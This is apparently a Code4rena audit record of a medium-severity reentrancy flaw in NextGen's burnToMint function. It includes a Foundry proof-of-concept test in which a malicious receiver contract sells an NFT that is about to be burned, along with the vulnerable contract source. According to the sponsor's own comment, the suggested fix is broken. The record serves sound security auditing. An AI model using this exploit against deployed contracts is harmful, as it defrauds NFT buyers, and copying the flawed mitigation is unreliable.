{
  "Title": "[M-03] Vulnerability in `burnToMint` function allows double use of NFT",
  "Content": "\nThe current implementation of the `burnToMint` function in the `NextGenCore.sol` smart contract permits a contract holder to both burn and sell the same NFT, effectively exploiting it to mint a new NFT. This leads to potential fraudulent activities when trading the NFT.\n\n### Proof of Concept\n\nThe vulnerability stems from the order of operations in the `burnToMint` function. Currently, a new token is minted (`_mintProcessing`) before the existing token is burned (`_burn`). This sequence of operations opens a window for exploitation:\n\n```javascript\nFile: smart-contracts/NextGenCore.sol\n213:     function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {\n214:         require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n215:         require(_isApprovedOrOwner(burner, _tokenId), \"ERC721: caller is not token owner or approved\");\n216:         collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;\n217:         if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {\n218:             _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n219:             // burn token\n220:             _burn(_tokenId);\n221:             burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;\n222:         }\n223:     }\n```\n\n<https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L213-L223>\n\nThe `_mintProcessing` function calls `_safeMint`, which in turn can trigger arbitrary code execution if the recipient is a contract. This allows for manipulation such as transferring the NFT (set to be burned) to another user before the burn occurs:\n\n```javascript\nFile: smart-contracts/NextGenCore.sol\n227:     function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {\n228:         tokenData[_mintIndex] = _tokenData;\n229:         collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);\n230:         tokenIdsToCollectionIds[_mintIndex] = _collectionID;\n231:         _safeMint(_recipient, _mintIndex);\n232:     }\n```\n\n<https://github.com/code-423n4/2023-10-nextgen/blob/58090c9fbc036c06bbaa9600ec326034f2181a17/hardhat/smart-contracts/NextGenCore.sol#L227-L232>\n\nA malicious actor can exploit this by listing the NFT for sale. When there is a buy offer, the malicious contract can call `burnToMint` to receive the new NFT and simultaneously accept an offer to buy the original NFT, resulting in the original NFT being burned but still sold, effectively duping the buyer.\n\nIn this POC scenario, there are two collections; 1 and 2. The admin is set so that users can burn token in collection 1 to mint token in collection 2.\n\n- A malicious contract has the token `10000000000` of collection 1, it lists the token `10000000000` in the marketplace.\n- `addr3` offers to buy the token `10000000000` from the malicious contract.\n- The malicious contract calls `burnToMint`, stimulously receives token `20000000000` from collection 2 and accepts the offer to buy `10000000000` from `addr3`.\n- In the end, token `10000000000` is burnt and `addr3` receives nothing. The malicious contract receives both token `20000000000` from `burnToMint` and proceed from the sales of token `10000000000`.\n\nPOC:\n\n- Save the code in `test/nextGen.test.sol`\n- Setup foundry and Run: forge test `-vvvvv --match-contract NextGenCoreTest --match-test testBurnToMintReentrancy`\n\n<details>\n\n```javascript\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport \"forge-std/Test.sol\";\nimport \"../smart-contracts/NextGenCore.sol\";\nimport \"../smart-contracts/NextGenAdmins.sol\";\nimport \"../smart-contracts/NFTdelegation.sol\";\nimport \"../smart-contracts/XRandoms.sol\";\nimport \"../smart-contracts/RandomizerNXT.sol\";\nimport \"../smart-contracts/MinterContract.sol\";\nimport \"../smart-contracts/AuctionDemo.sol\";\nimport \"../smart-contracts/IERC721Receiver.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract NextGenCoreTest is Test {\n    NextGenCore hhCore;\n    DelegationManagementContract hhDelegation;\n    randomPool hhRandoms;\n    NextGenAdmins hhAdmin;\n    NextGenRandomizerNXT hhRandomizer;\n    NextGenMinterContract hhMinter;\n    auctionDemo hhAuctionDemo;\n\n    address owner;\n    address addr1;\n    address addr2;\n    address addr3;\n\n    function setUp() public {\n        owner = address(this);\n        addr1 = vm.addr(1);\n        addr2 = vm.addr(2);\n        addr3 = vm.addr(3);\n\n        // Deploy contracts\n        hhDelegation = new DelegationManagementContract();\n        hhRandoms = new randomPool();\n        hhAdmin = new NextGenAdmins();\n        hhCore = new NextGenCore(\"Next Gen Core\", \"NEXTGEN\", address(hhAdmin));\n        hhRandomizer = new NextGenRandomizerNXT(\n            address(hhRandoms),\n            address(hhAdmin),\n            address(hhCore)\n        );\n        hhMinter = new NextGenMinterContract(\n            address(hhCore),\n            address(hhDelegation),\n            address(hhAdmin)\n        );\n    }\n\n        function testBurnToMintReentrancy() public {\n\n        // Setting up, creating 2 collections for burnToMint\n        string[] memory collectionScript = new string[](1);\n        collectionScript[0] = \"desc\";\n\n        hhCore.createCollection(\n            \"Test Collection 1\",\n            \"Artist 1\",\n            \"For testing\",\n            \"www.test.com\",\n            \"CCO\",\n            \"https://ipfs.io/ipfs/hash/\",\n            \"\",\n            collectionScript\n        );\n\n        hhCore.createCollection(\n            \"Test Collection 2\",\n            \"Artist 2\",\n            \"For testing\",\n            \"www.test.com\",\n            \"CCO\",\n            \"https://ipfs.io/ipfs/hash/\",\n            \"\",\n            collectionScript\n        );\n\n        hhAdmin.registerCollectionAdmin(1, address(addr1), true);\n        hhAdmin.registerCollectionAdmin(1, address(addr2), true);\n\n        vm.prank(addr1);\n        hhCore.setCollectionData(\n            1, // _collectionID\n            address(addr1), // _collectionArtistAddress\n            2, // _maxCollectionPurchases\n            10000, // _collectionTotalSupply\n            0 // _setFinalSupplyTimeAfterMint\n        );\n\n        hhCore.setCollectionData(\n            2, // _collectionID\n            address(addr2), // _collectionArtistAddress\n            2, // _maxCollectionPurchases\n            10000, // _collectionTotalSupply\n            0 // _setFinalSupplyTimeAfterMint\n        );\n\n        hhCore.addMinterContract(address(hhMinter));\n\n        hhCore.addRandomizer(1, address(hhRandomizer));\n        hhCore.addRandomizer(2, address(hhRandomizer));\n\n        hhMinter.setCollectionCosts(\n            1, // _collectionID\n            0, // _collectionMintCost\n            0, // _collectionEndMintCost\n            0, // _rate\n            5, // _timePeriod\n            1, // _salesOptions\n            0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B // delAddress\n            // 0x0000000000000000000000000000000000000000\n        );\n\n        hhMinter.setCollectionCosts(\n            2, // _collectionID\n            0, // _collectionMintCost\n            0, // _collectionEndMintCost\n            0, // _rate\n            5, // _timePeriod\n            1, // _salesOptions\n            0xD7ACd2a9FD159E69Bb102A1ca21C9a3e3A5F771B // delAddress\n            // 0x0000000000000000000000000000000000000000\n        );\n\n        hhMinter.setCollectionPhases(\n            1, // _collectionID\n            1696931278, // _allowlistStartTime\n            1696931280, // _allowlistEndTime\n            1696931282, // _publicStartTime\n            1796931284, // _publicEndTime\n            bytes32(\n                0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870\n            ) // _merkleRoot\n        );\n\n        hhMinter.setCollectionPhases(\n            2, // _collectionID\n            1696931278, // _allowlistStartTime\n            1696931280, // _allowlistEndTime\n            1696931282, // _publicStartTime\n            1796931284, // _publicEndTime\n            bytes32(\n                0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870\n            ) // _merkleRoot\n        );\n\n        bytes32[] memory merkleRoot = new bytes32[](1);\n        merkleRoot[\n            0\n        ] = 0x8e3c1713145650ce646f7eccd42c4541ecee8f07040fc1ac36fe071bbfebb870;\n\n        hhMinter.initializeBurn(1, 2, true);\n        \n        // Deploy a malicious contract to receive token 10000000000, later burn token 10000000000 to receive token 20000000000\n        MaliciousContract maliciousContract = new MaliciousContract(address(hhCore), address(addr2), address(addr3));\n\n        vm.warp(1796931283);\n\n        // Mint token 10000000000 to malicious contract\n        hhMinter.mint(\n            1, // _collectionID\n            1, // _numberOfTokens\n            0, // _maxAllowance\n            '{\"tdh\": \"100\"}', // _tokenData\n            address(maliciousContract), // _mintTo\n            merkleRoot, // _merkleRoot\n            address(addr1), // _delegator\n            2 //_varg0\n        );\n\n        // Malicious contract approve to addr2 so addr2 can call burnToMint on behalf of the malicious contract\n        vm.prank(addr2);\n        maliciousContract.approveToken();\n\n        vm.prank(addr2);\n        hhMinter.burnToMint(1, 10000000000, 2, 100);\n\n        assertEq(hhCore.ownerOf(20000000000), address(maliciousContract)); // Malicious contract receives token 20000000000 after burnToMint.\n        assertEq(hhCore.balanceOf(address(addr3)), 0); // NFT of addr3 is burnt\n    }\n}\n\ncontract MaliciousContract is IERC721Receiver {\n    address public collection;\n    address public admin;\n    address public receiver;\n    uint256 tokenIdToBurn = 10000000000;\n    uint256 tokenIdToReceive = 20000000000;\n    \n    constructor(address _collection, address _admin, address _receiver) {\n        collection = _collection;\n        admin = _admin;\n        receiver = _receiver;\n    }\n\n    function approveToken() external {\n        require(msg.sender == admin);\n        NextGenCore(collection).setApprovalForAll(admin, true);\n    }\n\n    function onERC721Received(\n        address _operator,\n        address _from,\n        uint256 _tokenId,\n        bytes calldata _data\n    ) external override returns (bytes4) {\n        if (_tokenId == tokenIdToBurn) {\n            return IERC721Receiver.onERC721Received.selector;\n        } else if (_tokenId == tokenIdToReceive) {\n            // after receive the token, accept the sale offer immediately to send the token to buyer. To simplify, call transfer to the buyer\n            NextGenCore(collection).transferFrom(address(this), receiver, tokenIdToBurn);\n            return IERC721Receiver.onERC721Received.selector;\n        }\n        \n    }\n}\n```\n\n</details>\n\n### Recommended Mitigation Steps\n\nThe order of operations in the `burnToMint` function should be revised to ensure that the token is burned before a new one is minted:\n\n```diff\n    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        require(_isApprovedOrOwner(burner, _tokenId), \"ERC721: caller is not token owner or approved\");\n        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {\n-           _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n            // burn token\n            _burn(_tokenId);\n            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;\n+           _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n        }\n    }\n```\n\n### Assessed type\n\nReentrancy\n\n**[a2rocket (NextGen) confirmed and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1823857801):**\n > The proposed mitigation is not fully corrected, as you need to store the current owner of the token before burning it and use that into `safeMint`. If you do it like it's proposed, the `safeMint` will not be able to send the token. \n\n**[0xsomeone (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1840693754):**\n > The Warden has showcased that due to the absence of the Checks-Effects-Interactions pattern, it is possible to utilize an NFT to-be-burned (i.e. to sell it) before the actual burning operation is executed.\n> \n> While the recommended alleviation does not work as expected per the Sponsor's comments, the submission is valid as it can cause the recipient of an NFT (if an open sale exists) to lose their value and not acquire any NFT.\n> \n> I will downgrade this to a medium severity vulnerability per the judging guidelines, as the only loss-of-value is a hypothetical value **of an external protocol (i.e. trading one) rather than the NextGen system**. \n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1845147371):**\n > The Warden's submission was selected as the best due to a correct title, cleaner & concise representation throughout, and illustrative recommended mitigation.\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-10-nextgen",
  "Code": [
    {
      "filename": "hardhat/smart-contracts/NextGenCore.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Smart Contract\n *  @date: 19-October-2023 \n *  @version: 10.28\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./ERC721Enumerable.sol\";\nimport \"./Ownable.sol\";\nimport \"./Strings.sol\";\nimport \"./Base64.sol\";\nimport \"./IRandomizer.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IMinterContract.sol\";\nimport \"./ERC2981.sol\";\n\ncontract NextGenCore is ERC721Enumerable, Ownable, ERC2981 {\n    using Strings for uint256;\n\n    // declare variables\n    uint256 public newCollectionIndex;\n\n    // collectionInfo struct declaration\n    struct collectionInfoStructure {\n        string collectionName;\n        string collectionArtist;\n        string collectionDescription;\n        string collectionWebsite;\n        string collectionLicense;\n        string collectionBaseURI;\n        string collectionLibrary;\n        string[] collectionScript;\n    }\n\n    // mapping of collectionInfo struct\n    mapping (uint256 => collectionInfoStructure) private collectionInfo;\n\n    // collectionAdditionalData struct declaration\n    struct collectionAdditonalDataStructure {\n        address collectionArtistAddress;\n        uint256 maxCollectionPurchases;\n        uint256 collectionCirculationSupply;\n        uint256 collectionTotalSupply;\n        uint256 reservedMinTokensIndex;\n        uint256 reservedMaxTokensIndex;\n        uint setFinalSupplyTimeAfterMint;\n        address randomizerContract;\n        IRandomizer randomizer;\n    }\n\n    // mapping of collectionAdditionalData struct\n    mapping (uint256 => collectionAdditonalDataStructure) private collectionAdditionalData;\n\n    // other mappings\n\n    // checks if a collection was created\n    mapping (uint256 => bool) private isCollectionCreated; \n\n    // checks if data on a collection were added\n    mapping (uint256 => bool) private wereDataAdded;\n\n    // maps tokends ids with collectionsids\n    mapping (uint256 => uint256) private tokenIdsToCollectionIds;\n\n    // stores randomizer hash\n    mapping(uint256 => bytes32) private tokenToHash;\n\n    // minted tokens per address per collection during public sale\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedPerAddress;\n\n    // minted tokens per address per collection during allowlist\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedAllowlistAddress;\n\n    // tokens airdrop per address per collection \n    mapping (uint256 => mapping (address => uint256)) private tokensAirdropPerAddress;\n\n    // current amount of burnt tokens per collection\n    mapping (uint256 => uint256) public burnAmount;\n\n    // modify the metadata view\n    mapping (uint256 => bool) public onchainMetadata; \n\n    // artist signature per collection\n    mapping (uint256 => string) public artistsSignatures;\n\n    // tokens additional metadata\n    mapping (uint256 => string) public tokenData;\n\n    // on-chain token Image URI and attributes\n    mapping (uint256 => string[2]) private tokenImageAndAttributes;\n\n    // collectionFreeze \n    mapping (uint256 => bool) private collectionFreeze;\n\n    // artist signed\n    mapping (uint256 => bool) public artistSigned; \n\n    // external contracts declaration\n    INextGenAdmins private adminsContract;\n    address public minterContract;\n\n    // smart contract constructor\n    constructor(string memory name, string memory symbol, address _adminsContract) ERC721(name, symbol) {\n        adminsContract = INextGenAdmins(_adminsContract);\n        newCollectionIndex = newCollectionIndex + 1;\n        _setDefaultRoyalty(0x1B1289E34Fe05019511d7b436a5138F361904df0, 690);\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to create a Collection\n\n    function createCollection(string memory _collectionName, string memory _collectionArtist, string memory _collectionDescription, string memory _collectionWebsite, string memory _collectionLicense, string memory _collectionBaseURI, string memory _collectionLibrary, string[] memory _collectionScript) public FunctionAdminRequired(this.createCollection.selector) {\n        collectionInfo[newCollectionIndex].collectionName = _collectionName;\n        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;\n        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;\n        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;\n        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;\n        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;\n        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;\n        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;\n        isCollectionCreated[newCollectionIndex] = true;\n        newCollectionIndex = newCollectionIndex + 1;\n    }\n\n    // function to add/modify the additional data of a collection\n    // once a collection is created and total supply is set it cannot be changed\n    // only _collectionArtistAddress , _maxCollectionPurchases can change after total supply is set\n\n    function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), \"err/freezed\");\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;\n            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n            collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);\n            collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;\n            wereDataAdded[_collectionID] = true;\n        } else if (artistSigned[_collectionID] == false) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        } else {\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        }\n    }\n\n    // Add Randomizer contract on collection\n\n    function addRandomizer(uint256 _collectionID, address _randomizerContract) public FunctionAdminRequired(this.addRandomizer.selector) {\n        require(IRandomizer(_randomizerContract).isRandomizerContract() == true, \"Contract is not Randomizer\");\n        collectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;\n        collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);\n    }\n\n    // airdrop called from minterContract\n    \n    function airDropTokens(uint256 mintIndex, address _recipient, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);\n            tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;\n        }\n    }\n\n    // mint called from minterContract\n\n    function mint(uint256 mintIndex, address _mintingAddress , address _mintTo, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID, uint256 phase) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);\n            if (phase == 1) {\n                tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;\n            } else {\n                tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;\n            }\n        }\n    }\n\n    // burn function\n\n    function burn(uint256 _collectionID, uint256 _tokenId) public {\n        require(_isApprovedOrOwner(_msgSender(), _tokenId), \"ERC721: caller is not token owner or approved\");\n        require ((_tokenId >= collectionAdditionalData[_collectionID].reservedMinTokensIndex) && (_tokenId <= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), \"id err\");\n        _burn(_tokenId);\n        burnAmount[_collectionID] = burnAmount[_collectionID] + 1;\n    }\n\n    // burn to mint called from minterContract\n\n    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        require(_isApprovedOrOwner(burner, _tokenId), \"ERC721: caller is not token owner or approved\");\n        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n            // burn token\n            _burn(_tokenId);\n            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;\n        }\n    }\n\n    // mint processing\n\n    function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {\n        tokenData[_mintIndex] = _tokenData;\n        collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);\n        tokenIdsToCollectionIds[_mintIndex] = _collectionID;\n        _safeMint(_recipient, _mintIndex);\n    }\n\n    // Additional setter functions\n\n    // function to update Collection Info\n\n    function updateCollectionInfo(uint256 _collectionID, string memory _newCollectionName, string memory _newCollectionArtist, string memory _newCollectionDescription, string memory _newCollectionWebsite, string memory _newCollectionLicense, string memory _newCollectionBaseURI, string memory _newCollectionLibrary, uint256 _index, string[] memory _newCollectionScript) public CollectionAdminRequired(_collectionID, this.updateCollectionInfo.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n         if (_index == 1000) {\n            collectionInfo[_collectionID].collectionName = _newCollectionName;\n            collectionInfo[_collectionID].collectionArtist = _newCollectionArtist;\n            collectionInfo[_collectionID].collectionDescription = _newCollectionDescription;\n            collectionInfo[_collectionID].collectionWebsite = _newCollectionWebsite;\n            collectionInfo[_collectionID].collectionLicense = _newCollectionLicense;\n            collectionInfo[_collectionID].collectionLibrary = _newCollectionLibrary;\n            collectionInfo[_collectionID].collectionScript = _newCollectionScript;\n        } else if (_index == 999) {\n            collectionInfo[_collectionID].collectionBaseURI = _newCollectionBaseURI;\n        } else {\n            collectionInfo[_collectionID].collectionScript[_index] = _newCollectionScript[0];\n        }\n    }\n\n    // function for artist signature\n\n    function artistSignature(uint256 _collectionID, string memory _signature) public {\n        require(msg.sender == collectionAdditionalData[_collectionID].collectionArtistAddress, \"Only artist\");\n        require(artistSigned[_collectionID] == false, \"Already Signed\");\n        artistsSignatures[_collectionID] = _signature;\n        artistSigned[_collectionID] = true;\n    }\n\n    // function change metadata view \n\n    function changeMetadataView(uint256 _collectionID, bool _status) public CollectionAdminRequired(_collectionID, this.changeMetadataView.selector) { \n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n        onchainMetadata[_collectionID] = _status;\n    }\n\n    // function to change the token data\n\n    function changeTokenData(uint256 _tokenId, string memory newData) public FunctionAdminRequired(this.changeTokenData.selector) {\n        require(collectionFreeze[tokenIdsToCollectionIds[_tokenId]] == false, \"Data frozen\");\n        _requireMinted(_tokenId);\n        tokenData[_tokenId] = newData;\n    }\n\n    // function to add a thumbnail image\n\n    function updateImagesAndAttributes(uint256[] memory _tokenId, string[] memory _images, string[] memory _attributes) public FunctionAdminRequired(this.updateImagesAndAttributes.selector) {\n        for (uint256 x; x < _tokenId.length; x++) {\n            require(collectionFreeze[tokenIdsToCollectionIds[_tokenId[x]]] == false, \"Data frozen\");\n            _requireMinted(_tokenId[x]);\n            tokenImageAndAttributes[_tokenId[x]][0] = _images[x];\n            tokenImageAndAttributes[_tokenId[x]][1] = _attributes[x];\n        }\n    }\n\n    // freeze collection\n\n    function freezeCollection(uint256 _collectionID) public FunctionAdminRequired(this.freezeCollection.selector) {\n        require(isCollectionCreated[_collectionID] == true, \"No Col\");\n        collectionFreeze[_collectionID] = true;\n    }\n\n    // set tokenHash\n\n    function setTokenHash(uint256 _collectionID, uint256 _mintIndex, bytes32 _hash) external {\n        require(msg.sender == collectionAdditionalData[_collectionID].randomizerContract);\n        require(tokenToHash[_mintIndex] == 0x0000000000000000000000000000000000000000000000000000000000000000);\n        tokenToHash[_mintIndex] = _hash;\n    }\n\n    // set final supply\n\n    function setFinalSupply(uint256 _collectionID) public FunctionAdminRequired(this.setFinalSupply.selector) {\n        require (block.timestamp > IMinterContract(minterContract).getEndTime(_collectionID) + collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, \"Time has not passed\");\n        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;\n        collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;\n    }\n\n    // function to add a minter contract\n\n    function addMinterContract(address _minterContract) public FunctionAdminRequired(this.addMinterContract.selector) { \n        require(IMinterContract(_minterContract).isMinterContract() == true, \"Contract is not Minter\");\n        minterContract = _minterContract;\n    }\n\n    // function to update admin contract\n\n    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {\n        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, \"Contract is not Admin\");\n        adminsContract = INextGenAdmins(_newadminsContract);\n    }\n\n    // function to update default royalties\n    \n    function setDefaultRoyalties(address _royaltyAddress, uint96 _bps) public FunctionAdminRequired(this.setDefaultRoyalties.selector) {\n        _setDefaultRoyalty(_royaltyAddress, _bps);\n    }\n\n    // Retrieve Functions\n\n    // function to override supportInterface\n\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721Enumerable, ERC2981) returns (bool) { \n        return super.supportsInterface(interfaceId); \n    }\n\n    // function to return the tokenURI\n\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        _requireMinted(tokenId);\n        if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] != 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n        } else if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] == 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, \"pending\")) : \"\";\n        }\n        else {\n            string memory b64 = Base64.encode(abi.encodePacked(\"<html><head></head><body><script src=\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionLibrary,\"\\\"></script><script>\",retrieveGenerativeScript(tokenId),\"</script></body></html>\"));\n            string memory _uri = string(abi.encodePacked(\"data:application/json;utf8,{\\\"name\\\":\\\"\",getTokenName(tokenId),\"\\\",\\\"description\\\":\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionDescription,\"\\\",\\\"image\\\":\\\"\",tokenImageAndAttributes[tokenId][0],\"\\\",\\\"attributes\\\":[\",tokenImageAndAttributes[tokenId][1],\"],\\\"animation_url\\\":\\\"data:text/html;base64,\",b64,\"\\\"}\"));\n            return _uri;\n        }\n    }\n\n    // function get Name\n\n    function getTokenName(uint256 tokenId) private view returns(string memory)  {\n        uint256 tok = tokenId - collectionAdditionalData[tokenIdsToCollectionIds[tokenId]].reservedMinTokensIndex;\n        return string(abi.encodePacked(collectionInfo[viewColIDforTokenID(tokenId)].collectionName, \" #\" ,tok.toString()));\n    }\n\n    // retrieve the collection freeze status\n    function collectionFreezeStatus(uint256 _collectionID) public view returns(bool){\n        return collectionFreeze[_collectionID];\n    }\n\n    // function to return the collection id given a token id\n    function viewColIDforTokenID(uint256 _tokenid) public view returns (uint256) {\n        return(tokenIdsToCollectionIds[_tokenid]);\n    }\n\n    // retrieve if data were added\n    function retrievewereDataAdded(uint256 _collectionID) external view returns(bool){\n        return wereDataAdded[_collectionID];\n    }\n\n    // function to return the min index id of a collection\n\n    function viewTokensIndexMin(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMinTokensIndex);\n    }\n\n    // function to return the max index id of a collection\n\n    function viewTokensIndexMax(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMaxTokensIndex);\n    }\n\n    // function to return the circ supply of a collection\n    function viewCirSupply(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].collectionCirculationSupply);\n    }\n\n    // function to return max allowance in public sale\n    function viewMaxAllowance(uint256 _collectionID) external view returns (uint256) {\n        